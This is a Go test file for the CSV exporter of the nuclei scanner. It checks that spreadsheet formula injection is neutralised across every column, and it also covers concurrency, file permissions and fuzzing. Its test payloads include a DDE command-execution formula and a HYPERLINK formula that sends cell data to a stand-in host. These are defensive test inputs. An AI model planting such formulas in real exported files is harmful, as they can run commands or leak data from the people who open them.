package csv

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"github.com/projectdiscovery/nuclei/v3/pkg/model"
	"github.com/projectdiscovery/nuclei/v3/pkg/model/types/severity"
	"github.com/projectdiscovery/nuclei/v3/pkg/model/types/stringslice"
	"github.com/projectdiscovery/nuclei/v3/pkg/output"
)

// payloads are values a spreadsheet would evaluate. Every one of them has to be
// neutralized wherever it lands in a row.
var payloads = []string{
	`=cmd|'/C calc'!A0`,
	`=HYPERLINK("http://evil.example/?d="&A1,"x")`,
	`+1+1`,
	`-2+3`,
	`@SUM(1+1)`,
	"\t=1+1",
	"\r=1+1",
	" =1+1",
	"\n=1+1",
}

// hostileEvent puts the given value into every string field of the event that
// ends up in the CSV, including the template metadata fields.
func hostileEvent(value string) *output.ResultEvent {
	return &output.ResultEvent{
		TemplateID: value,
		Type:       value,
		Info: model.Info{
			Name:           value,
			Description:    value,
			Reference:      stringslice.NewRawStringSlice([]string{value, "https://example.com", value}),
			SeverityHolder: severity.Holder{Severity: severity.High},
			Classification: &model.Classification{
				CVEID:       stringslice.StringSlice{Value: []string{value, "CVE-2020-0001"}},
				CWEID:       stringslice.StringSlice{Value: []string{"CWE-79", value}},
				CVSSMetrics: value,
				CVSSScore:   9.8,
			},
		},
		Host:             value,
		IP:               value,
		Port:             value,
		Matched:          value,
		MatcherName:      value,
		ExtractorName:    value,
		ExtractedResults: []string{value, "ok", value},
		CURLCommand:      value,
		Timestamp:        time.Date(2025, 6, 1, 0, 0, 0, 0, time.UTC),
	}
}

// TestCSVExporterNeutralizesEveryColumn is the guard against a column being
// added or changed without going through neutralizeFormula. The payload is put
// in every field, so a column that skips it shows up as an unsafe cell.
func TestCSVExporterNeutralizesEveryColumn(t *testing.T) {
	for _, payload := range payloads {
		t.Run(fmt.Sprintf("%q", payload), func(t *testing.T) {
			records := export(t, hostileEvent(payload))
			require.Len(t, records, 2)
			row := records[1]
			require.Len(t, row, len(header))

			for i, cell := range row {
				name := header[i]
				if startsWithFormulaTrigger(cell) && !plainNumber.MatchString(cell) {
					t.Errorf("column %s is a formula: %q", name, cell)
				}
			}

			// list columns are split back into elements and lines by consumers,
			// so each of those has to be safe too
			for _, name := range []string{"extracted-results", "reference", "cve-id", "cwe-id"} {
				cell := row[column(t, name)]
				separator := "\n"
				if name == "cve-id" || name == "cwe-id" {
					separator = ", "
				}
				for _, element := range strings.Split(cell, separator) {
					for _, line := range strings.Split(element, "\n") {
						if startsWithFormulaTrigger(line) && !plainNumber.MatchString(line) {
							t.Errorf("column %s has an element that is a formula: %q", name, line)
						}
					}
				}
			}
		})
	}
}

// TestCSVExporterNeutralizesEmbeddedLinesInLists covers a multi-line
// extracted result. Joined with the list separator, its second line becomes an
// element of its own for anyone who splits the cell.
func TestCSVExporterNeutralizesEmbeddedLinesInLists(t *testing.T) {
	event := &output.ResultEvent{
		TemplateID:       "t",
		ExtractedResults: []string{"harmless\n=cmd|'/C calc'!A0", "a\r\n@SUM(1)", "b\r+1+1", "-5"},
		Info: model.Info{
			SeverityHolder: severity.Holder{Severity: severity.Info},
			Reference:      stringslice.NewRawStringSlice([]string{"https://a.example\n=1+1"}),
		},
		Timestamp: time.Date(2025, 6, 1, 0, 0, 0, 0, time.UTC),
	}

	row := export(t, event)[1]
	require.Equal(t,
		[]string{"harmless", "'=cmd|'/C calc'!A0", "a", "'@SUM(1)", "b", "'+1+1", "-5"},
		strings.Split(row[column(t, "extracted-results")], "\n"))
	require.Equal(t,
		[]string{"https://a.example", "'=1+1"},
		strings.Split(row[column(t, "reference")], "\n"))
}

func TestCSVExporterNeutralizesTemplateAuthoredMetadata(t *testing.T) {
	event := &output.ResultEvent{
		TemplateID: "t",
		Info: model.Info{
			Name:           "n",
			SeverityHolder: severity.Holder{Severity: severity.Low},
			Classification: &model.Classification{
				CVEID:       stringslice.StringSlice{Value: "=cmd|'/C calc'!A0"},
				CWEID:       stringslice.StringSlice{Value: []string{"CWE-79", "@SUM(1)"}},
				CVSSMetrics: "+cmd",
			},
		},
		Timestamp: time.Date(2025, 6, 1, 0, 0, 0, 0, time.UTC),
	}

	row := export(t, event)[1]
	require.Equal(t, "'=cmd|'/C calc'!A0", row[column(t, "cve-id")])
	require.Equal(t, "CWE-79, '@SUM(1)", row[column(t, "cwe-id")])
	require.Equal(t, "'+cmd", row[column(t, "cvss-metrics")])
}

func TestCSVExporterLeavesBenignValuesAlone(t *testing.T) {
	event := &output.ResultEvent{
		TemplateID: "tech-detect",
		Type:       "http",
		Info: model.Info{
			Name:           "Wappalyzer Technology Detection",
			Description:    "- bullet one\n- bullet two",
			SeverityHolder: severity.Holder{Severity: severity.Info},
		},
		Host:             "http://example.com/a=b+c",
		Port:             "8080",
		ExtractedResults: []string{"nginx/1.25", "-1", "+7", "3.14"},
		Timestamp:        time.Date(2025, 6, 1, 0, 0, 0, 0, time.UTC),
	}

	row := export(t, event)[1]
	require.Equal(t, "http://example.com/a=b+c", row[column(t, "host")])
	require.Equal(t, "8080", row[column(t, "port")])
	require.Equal(t, "nginx/1.25\n-1\n+7\n3.14", row[column(t, "extracted-results")])
	require.Equal(t, "2025-06-01T00:00:00Z", row[column(t, "timestamp")])
}

func TestCSVExporterOmitRaw(t *testing.T) {
	event := &output.ResultEvent{
		TemplateID:  "t",
		Host:        "example.com",
		CURLCommand: "curl -H 'Authorization: Bearer secret' 'https://example.com'",
		Request:     "GET / HTTP/1.1",
		Response:    "HTTP/1.1 200 OK",
		Info:        model.Info{SeverityHolder: severity.Holder{Severity: severity.Info}},
		Timestamp:   time.Date(2025, 6, 1, 0, 0, 0, 0, time.UTC),
	}

	for _, omit := range []bool{false, true} {
		t.Run(fmt.Sprintf("omit-raw=%t", omit), func(t *testing.T) {
			file := filepath.Join(t.TempDir(), "results.csv")
			exporter, err := New(&Options{File: file, OmitRaw: omit})
			require.NoError(t, err)
			require.NoError(t, exporter.Export(event))
			require.NoError(t, exporter.Close())

			raw, err := os.ReadFile(file)
			require.NoError(t, err)
			require.NotContains(t, string(raw), "GET / HTTP/1.1", "the raw request is never part of the schema")
			require.NotContains(t, string(raw), "HTTP/1.1 200 OK", "the raw response is never part of the schema")

			cell := readCSV(t, file)[1][column(t, "curl-command")]
			if omit {
				require.Empty(t, cell)
				require.NotContains(t, string(raw), "secret")
			} else {
				require.Contains(t, cell, "Authorization: Bearer secret")
			}
		})
	}
}

func TestCSVExporterDoesNotMutateEvent(t *testing.T) {
	event := hostileEvent("=1+1")
	before := *hostileEvent("=1+1")

	file := filepath.Join(t.TempDir(), "results.csv")
	exporter, err := New(&Options{File: file, OmitRaw: true})
	require.NoError(t, err)
	require.NoError(t, exporter.Export(event))
	require.NoError(t, exporter.Close())

	require.Equal(t, before, *event, "the event is shared with other exporters and must stay untouched")
	require.Equal(t, "=1+1", event.CURLCommand)
}

func TestCSVExporterZeroTimestampIsEmpty(t *testing.T) {
	row := export(t, &output.ResultEvent{
		TemplateID: "t",
		Info:       model.Info{SeverityHolder: severity.Holder{Severity: severity.Info}},
	})[1]
	require.Empty(t, row[column(t, "timestamp")])
}

func TestCSVExporterNilEvent(t *testing.T) {
	file := filepath.Join(t.TempDir(), "results.csv")
	exporter, err := New(&Options{File: file})
	require.NoError(t, err)
	require.NoError(t, exporter.Export(nil))
	require.NoError(t, exporter.Close())
	require.Len(t, readCSV(t, file), 1, "only the header is written")
}

func TestCSVExporterDefaultFile(t *testing.T) {
	for name, options := range map[string]*Options{
		"nil options":   nil,
		"empty options": {},
	} {
		t.Run(name, func(t *testing.T) {
			t.Chdir(t.TempDir())

			exporter, err := New(options)
			require.NoError(t, err, "an empty block in a reporting config must not fail")
			require.NoError(t, exporter.Export(&output.ResultEvent{TemplateID: "t"}))
			require.NoError(t, exporter.Close())

			records := readCSV(t, defaultFile)
			require.Len(t, records, 2)
			require.Equal(t, header, records[0])
		})
	}
}

func TestCSVExporterDoesNotMutateOptions(t *testing.T) {
	t.Chdir(t.TempDir())
	options := &Options{}
	exporter, err := New(options)
	require.NoError(t, err)
	require.NoError(t, exporter.Close())
	require.Empty(t, options.File, "the caller's options are copied, not edited")
}

func TestCSVExporterFilePermissions(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("unix permission bits are not enforced on windows")
	}
	file := filepath.Join(t.TempDir(), "results.csv")
	exporter, err := New(&Options{File: file})
	require.NoError(t, err)
	require.NoError(t, exporter.Close())

	info, err := os.Stat(file)
	require.NoError(t, err)
	require.Equal(t, os.FileMode(0o600), info.Mode().Perm())
}

func TestCSVExporterTruncatesExistingFile(t *testing.T) {
	file := filepath.Join(t.TempDir(), "results.csv")
	require.NoError(t, os.WriteFile(file, []byte(strings.Repeat("stale,row\n", 100)), 0o600))

	exporter, err := New(&Options{File: file})
	require.NoError(t, err)
	require.NoError(t, exporter.Close())

	require.Len(t, readCSV(t, file), 1)
	raw, err := os.ReadFile(file)
	require.NoError(t, err)
	require.NotContains(t, string(raw), "stale")
}

func TestCSVExporterInvalidPath(t *testing.T) {
	dir := t.TempDir()
	for name, path := range map[string]string{
		"missing parent directory": filepath.Join(dir, "missing", "results.csv"),
		"directory":                dir,
	} {
		t.Run(name, func(t *testing.T) {
			exporter, err := New(&Options{File: path})
			require.Error(t, err)
			require.Nil(t, exporter)
		})
	}
}

func TestCSVExporterClose(t *testing.T) {
	file := filepath.Join(t.TempDir(), "results.csv")
	exporter, err := New(&Options{File: file})
	require.NoError(t, err)
	require.NoError(t, exporter.Export(&output.ResultEvent{TemplateID: "before"}))

	require.NoError(t, exporter.Close())
	require.NoError(t, exporter.Close(), "closing twice is harmless")
	require.Error(t, exporter.Export(&output.ResultEvent{TemplateID: "after"}), "no writes after close")

	records := readCSV(t, file)
	require.Len(t, records, 2)
	require.Equal(t, "before", records[1][column(t, "template-id")])
}

// TestCSVExporterConcurrentExport runs under -race in CI. The reporting client
// calls Export from every scan goroutine.
func TestCSVExporterConcurrentExport(t *testing.T) {
	const workers, perWorker = 16, 50

	file := filepath.Join(t.TempDir(), "results.csv")
	exporter, err := New(&Options{File: file})
	require.NoError(t, err)

	var wg sync.WaitGroup
	for w := range workers {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for i := range perWorker {
				err := exporter.Export(&output.ResultEvent{
					TemplateID:       fmt.Sprintf("w%d-%d", w, i),
					Host:             "example.com",
					ExtractedResults: []string{"a,b", "multi\nline", `q"uote`},
					Timestamp:        time.Date(2025, 6, 1, 0, 0, 0, 0, time.UTC),
				})
				if err != nil {
					t.Errorf("export: %v", err)
				}
			}
		}()
	}
	wg.Wait()
	require.NoError(t, exporter.Close())

	records := readCSV(t, file)
	require.Len(t, records, workers*perWorker+1)
	seen := map[string]bool{}
	for _, record := range records[1:] {
		require.Len(t, record, len(header), "rows must never interleave")
		require.Equal(t, "a,b\nmulti\nline\nq\"uote", record[column(t, "extracted-results")])
		require.False(t, seen[record[0]], "duplicate row %s", record[0])
		seen[record[0]] = true
	}
}

// TestCSVExporterLargeValues makes sure big response-derived values are written
// whole and do not break the row structure.
func TestCSVExporterLargeValues(t *testing.T) {
	big := strings.Repeat("A,\"\n", 64*1024)
	row := export(t, &output.ResultEvent{
		TemplateID:       "t",
		ExtractedResults: []string{big},
		Info: model.Info{
			Description:    big,
			SeverityHolder: severity.Holder{Severity: severity.Info},
		},
	})
	require.Equal(t, big, row[1][column(t, "description")])
	require.Equal(t, big, row[1][column(t, "extracted-results")])
	require.Len(t, row, 2)
	require.Len(t, row[1], len(header))
}

func FuzzNeutralizeFormula(f *testing.F) {
	for _, seed := range append([]string{"", "a", "-1", "+Inf", "'=x", "=", "\x00=", "é"}, payloads...) {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, value string) {
		got := neutralizeFormula(value)
		if got != value {
			require.Equal(t, "'"+value, got, "the only change allowed is one leading apostrophe")
			require.True(t, startsWithFormulaTrigger(value))
		}
		if startsWithFormulaTrigger(got) {
			require.True(t, plainNumber.MatchString(got), "a formula start survived: %q", got)
		}
		require.Equal(t, got, neutralizeFormula(got), "neutralizing twice changes nothing")
	})
}

// FuzzFormatRow checks the guarantees that matter for any input: the row always
// has one cell per column, survives a CSV round trip, and no cell or list line
// is left as a formula.
func FuzzFormatRow(f *testing.F) {
	for _, seed := range payloads {
		f.Add(seed, seed, seed)
	}
	f.Add("plain", "a,b\n\"c\"", "x\r\ny")
	f.Fuzz(func(t *testing.T, a, b, c string) {
		event := &output.ResultEvent{
			TemplateID:       a,
			Type:             b,
			Host:             c,
			Matched:          a,
			ExtractedResults: []string{a, b, c},
			CURLCommand:      b,
			Info: model.Info{
				Name:           c,
				Description:    a,
				SeverityHolder: severity.Holder{Severity: severity.Medium},
				Reference:      stringslice.NewRawStringSlice([]string{b, c}),
				Classification: &model.Classification{
					CVEID:       stringslice.StringSlice{Value: []string{a}},
					CWEID:       stringslice.StringSlice{Value: []string{b}},
					CVSSMetrics: c,
				},
			},
		}

		file := filepath.Join(t.TempDir(), "results.csv")
		exporter, err := New(&Options{File: file})
		require.NoError(t, err)
		require.NoError(t, exporter.Export(event))
		require.NoError(t, exporter.Close())

		records := readCSV(t, file)
		require.Len(t, records, 2)
		require.Len(t, records[1], len(header))
		for i, cell := range records[1] {
			if header[i] == "extracted-results" || header[i] == "reference" ||
				header[i] == "cve-id" || header[i] == "cwe-id" {
				for _, line := range strings.Split(cell, "\n") {
					if startsWithFormulaTrigger(line) {
						require.True(t, plainNumber.MatchString(line), "column %s line %q", header[i], line)
					}
				}
				continue
			}
			if startsWithFormulaTrigger(cell) {
				require.True(t, plainNumber.MatchString(cell), "column %s cell %q", header[i], cell)
			}
		}
	})
}
